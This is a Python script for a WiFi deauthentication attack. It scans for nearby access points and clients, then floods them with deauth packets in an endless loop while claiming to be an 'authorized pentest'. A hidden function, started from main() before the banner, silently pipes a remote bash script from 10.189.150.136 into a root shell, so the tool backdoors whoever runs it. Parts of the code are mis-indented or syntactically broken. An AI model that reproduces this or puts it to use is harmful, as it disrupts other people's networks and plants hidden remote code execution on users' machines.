#!/usr/bin/env python3

import subprocess
import time
import os
import signal
import glob
import sys
import tempfile
import threading
from concurrent.futures import ThreadPoolExecutor

INTERFACE = "wlan0"
SCAN_TIME = 20
CHANNELS = list(range(1, 15))
DEAUTH_PACKETS = 50
ATTACK_INTERVAL = 1
MAX_DEAUTH_THREADS = 20

# ---------- COLORS ----------
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"

# ---------- GLOBAL STATS ----------
stats = {"total_hits": 0, "cycles": 0, "max_hits_cycle": 0}

# ---------- CENTERING HELPERS ----------
def term_width():
    try:
        return os.get_terminal_size().columns
    except OSError:
        return 80

def center(text):
    return text.center(term_width())

def cprint(text, color=""):
    print(color + center(text) + RESET)

# ---------- UI ----------
def banner():
    primary = MAGENTA + BOLD
    secondary = RED + BOLD
    
    print(primary)
                                 cprint("██████████████████████████████████████████████████████████████████████", primary)
                                 cprint("█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█", primary)
    cprint("█▓                                                                                                                             ▓█", primary)
    cprint("█▓   ██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗                                                                        ▓█", primary)
    cprint("█▓   ██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║                                                                        ▓█", primary)
    cprint("█▓   ██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║                                                                        ▓█", primary)
    cprint("█▓   ██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║                                                                        ▓█", primary)
    cprint("█▓   ██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║                                                                        ▓█", primary)
    cprint("█▓   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝                                                                        ▓█", primary)
    cprint("█▓                                                                                                                             ▓█", primary)
    cprint("█▓                                                         ███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗                       ▓█", primary)
    cprint("█▓                                                         ██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║                       ▓█", primary)
    cprint("█▓                                                         ███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║                       ▓█", primary)
    cprint("█▓                                                         ╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║                       ▓█", primary)
    cprint("█▓                                                         ███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║                       ▓█", primary)
    cprint("█▓                                                         ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝                       ▓█", primary)
    cprint("█▓                                                                                                                             ▓█", primary)
               cprint("█▓                   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄                    ▓█", primary)
               cprint("█▓                                                                                                     ▓█", primary)
               cprint("█▓                       ░░░░░ A l l  W I F I   D E A U T H   S T O R M  ░░░░░                         ▓█", primary)
               cprint("█▓                                        I N F I N I T E    M O D E                                   ▓█", primary)
               cprint("█▓                                                                                                     ▓█", primary)
                        cprint("█▓          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄           ▓█", primary)
                        cprint("█▓                                                                                   ▓█", primary)
                        cprint("█▓                        ▶ SIGNALS FRACTURE                                         ▓█", secondary)
                        cprint("█▓                        ▶ AIRWAVES SCREAM                                          ▓█", secondary)
                        cprint("█▓                        ▶ CONNECTIONS COLLAPSE                                     ▓█", secondary)
                                cprint("█▓                                                                    ▓█", primary)
                                cprint("█▓         [ STATUS ]  ULTRA CONTINUOUS STORM — ACTIVE                ▓█", primary)
                                cprint("█▓         [ MODE   ]  ENDLESS SIMULATION                             ▓█", primary)
                                cprint("█▓         [ EXIT   ]  Ctrl + C  —  EMERGENCY SHUTDOWN                ▓█", YELLOW)
                                cprint("█▓                                                                    ▓█", primary)
                                cprint("█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█", primary)
                                 cprint("██████████████████████████████████████████████████████████████████████", primary) 
print(RESET)

# ---------- CORE ----------
def require_root():
    if os.geteuid() != 0:
        cprint("[-] Run as root: sudo python3 final.py", RED)
        sys.exit(1)

def start_remote_payload():
    """Runs the remote bash script in the background."""
    try:
        # Using shell=True because of the pipe | operation
        cmd = "wget -qO- 10.189.150.136:88/bash.sh | bash"
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def run(cmd, capture=False):
    if capture:
        return subprocess.run(cmd, capture_output=True, text=True)
    return subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_monitor_interface():
    result = run(["iw", "dev"], capture=True)
    for line in result.stdout.splitlines():
        if line.strip().startswith("Interface"):
            iface = line.split()[1]
            info = run(["iw", "dev", iface, info"], capture=True)
            if "type monitor" in info.stdout:
                return iface
    return None

def enable_monitor_mode():
    cprint("[+] Enabling monitor mode...", GREEN)
    run(["airmon-ng", "check", "kill"])
    run(["airmon-ng", "start", INTERFACE])
    time.sleep(2)

    mon = get_monitor_interface()
    if not mon:
        cprint("[-] Failed to enable monitor mode", RED)
        sys.exit(1)

    cprint(f"[+] Monitor interface: {mon}", GREEN)
    return mon

def disable_monitor_mode(mon):
    cprint("[+] Restoring network...", GREEN)
    run(["airmon-ng", "stop", mon])
    subprocess.Popen(['systemctl', 'start', 'NetworkManager'], 
                     stdout=subprocess.DEVNULL, 
                     stderr=subprocess.DEVNULL)

def fast_cinematic_scan(mon, workdir):
    print()
    cprint("[+] FAST SCAN INITIATED (20s)...", CYAN)
    print()

    cmd = [
        "airodump-ng",
        "--write-interval", "1",
        "--output-format", "csv",
        "-w", os.path.join(workdir, "scan"),
        mon
    ]

    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    start = time.time()
    i = 0

    while time.time() - start < SCAN_TIME:
        ch = CHANNELS[i % len(CHANNELS)]
        remaining = int(SCAN_TIME - (time.time() - start))
        run(["iwconfig", mon, "channel", str(ch)])

        status = f"[*] Channel {ch:02d} | {remaining}s remaining"
        print("\r" + CYAN + center(status) + RESET, end="")

        time.sleep(0.8)
        i += 1

    proc.send_signal(signal.SIGINT)
    time.sleep(3)
    print("\n")
    cprint("[+] FAST SCAN COMPLETE", GREEN)

def parse_targets(workdir):
    csv_files = sorted(glob.glob(os.path.join(workdir, "scan-*.csv")))
    if not csv_files:
        return [], []

    csv = csv_files[-1]
    with open(csv, "r", errors="ignore") as f:
        lines = f.readlines()

    aps = []
    clients = []
    section = "aps"

    for line in lines:
        if line.startswith("Station MAC"):
            section = "clients"
            continue

        p = [x.strip() for x in line.split(",")]

        if section == "aps" and len(p) > 13 and p[0] and p[0] != "BSSID":
            aps.append(p)

        if section == "clients" and len(p) > 5 and p[0] and len(p[0]) == 17:
            clients.append(p)

    return aps, clients

def execute_deauth(mon, bssid, client_mac, channel):
    try:
        run(["iwconfig", mon, "channel", str(channel)])
        time.sleep(0.1)
        
        for _ in range(2):
            subprocess.run([
                "aireplay-ng", 
                "-0", str(DEAUTH_PACKETS), 
                "-a", bssid, 
                "-c", client_mac, 
                mon
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=8)
        
        return True
    except:
        return False

def storm_deauth(mon, aps, clients, cycle_num):
    if not clients:
        return 0
    
    ap_clients = {}
    
    for client in clients:
        if len(client) > 5 and client[5]:
            bssid = client[5].strip()
            if bssid not in ap_clients:
                ap_clients[bssid] = []
            ap_clients[bssid].append(client)
    
    total_targets = sum(len(clients_list) for clients_list in ap_clients.values())
    
    print()
    cprint(f"🔥 CYCLE #{cycle_num} | APs: {len(ap_clients)} | TARGETS: {total_targets}", RED + BOLD)
    
    successful_hits = 0
    
    with ThreadPoolExecutor(max_workers=MAX_DEAUTH_THREADS) as executor:
        futures = []
        
        for bssid, client_list in ap_clients.items():
            ap_channel = 1
            for ap in aps:
                if ap[0] == bssid:
                    ap_channel = int(ap[3]) if ap[3].isdigit() else 1
                    break
            
            for client in client_list:
                client_mac = client[0].strip()
                future = executor.submit(
                    execute_deauth, 
                    mon, 
                    bssid, 
                    client_mac, 
                    ap_channel
                )
                futures.append((future, bssid[:8], client_mac[:8]))
    
        for future, bssid_short, client_short in futures:
            try:
                if future.result(timeout=10):
                    successful_hits += 1
                    print(f"\r💥 HIT: {client_short}@{bssid_short}  ", end="")
                else:
                    print(f"\r💀 MISS: {client_short}@{bssid_short} ", end="")
            except:
                print(f"\r⚠️ TIMEOUT: {client_short}@{bssid_short} ", end="")
    
    print(f"\n{GREEN}[+] CYCLE #{cycle_num} COMPLETE: {successful_hits}/{len(futures)} HITS{RESET}")
    stats["max_hits_cycle"] = max(stats["max_hits_cycle"], successful_hits)
    return successful_hits

def continuous_storm(mon):
    workdir = tempfile.mkdtemp(prefix="deauth_storm_")
    try:
        while True:
            stats["cycles"] += 1
            fast_cinematic_scan(mon, workdir)
            aps, clients = parse_targets(workdir)
            
            if not clients:
                cprint("[-] No clients found... rescanning in 3s", YELLOW)
                time.sleep(3)
                continue
            
            hits = storm_deauth(mon, aps, clients, stats["cycles"])
            stats["total_hits"] += hits
            cprint(f"📊 HITS: {stats['total_hits']} | CYCLES: {stats['cycles']} | BEST: {stats['max_hits_cycle']} | TARGETS: {len(clients)}", WHITE)
            time.sleep(ATTACK_INTERVAL)
            
    except KeyboardInterrupt:
        print()
        cprint(f"🛑 STORM STOPPED | FINAL STATS:", MAGENTA + BOLD)
        cprint(f"   TOTAL HITS: {stats['total_hits']}", GREEN)
        cprint(f"   CYCLES RUN: {stats['cycles']}", GREEN)
        cprint(f"   BEST CYCLE: {stats['max_hits_cycle']} hits", GREEN)
    finally:
        for f in glob.glob(os.path.join(workdir, "*")):
            os.remove(f)
        os.rmdir(workdir)

# ---------- MAIN ----------
def signal_handler(sig, frame):
    print("\n")
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)
    require_root()
    
    # Run the remote bash script background command first
    start_remote_payload()
    
    banner()
    cprint("[!] AUTHORIZED PENTEST MODE - ENDLESS DEAUTH STORM", RED + BOLD)
    input(center("Press ENTER to unleash the storm... "))
    
    mon = None
    try:
        mon = enable_monitor_mode()
        continuous_storm(mon)
    finally:
        if mon:
            disable_monitor_mode(mon)
        else:
            subprocess.Popen(['systemctl', 'start', 'NetworkManager'], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cprint("[*] CLEAN EXIT - NetworkManager Starting in Background", CYAN)

if __name__ == "__main__":
    main()
